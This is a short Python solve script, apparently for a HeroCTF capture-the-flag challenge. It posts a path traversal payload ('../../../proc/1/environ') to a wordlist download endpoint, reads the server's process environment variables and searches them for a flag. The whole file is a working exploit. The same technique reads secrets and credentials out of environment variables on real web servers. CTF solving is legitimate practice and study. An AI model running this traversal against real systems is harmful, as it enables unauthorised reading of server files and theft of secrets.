import requests
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://dyn05.heroctf.fr:12273"

def solve():
    print(f"[*] Target: {TARGET}")
    
    # Vulnerable Endpoint
    url = f"{TARGET}/api/wordlist/download"
    
    # Payload: Traverse to root, then access procfs for PID 1
    payload = {
        "filename": "../../../proc/1/environ"
    }

    try:
        print(f"[*] Sending payload to {url}...")
        res = requests.post(url, json=payload)

        if res.status_code != 200:
            print(f"[-] Error: Server returned status {res.status_code}")
            return

        data = res.json()
        raw_env = data["content"]
        print("[+] Successfully read /proc/1/environ")

        # Environment variables in procfs are null-byte separated
        env_vars = raw_env.split('\x00')
        
        for var in env_vars:
            if var.startswith("FLAG=") or "Hero{" in var:
                print(f"\n[SUCCESS] Flag found:\n{var}")
                if "=" in var:
                    print(f"Value: {var.split('=', 1)[1]}")
                return

    except Exception as e:
        print(f"[-] Exception: {e}")

if __name__ == "__main__":
    solve()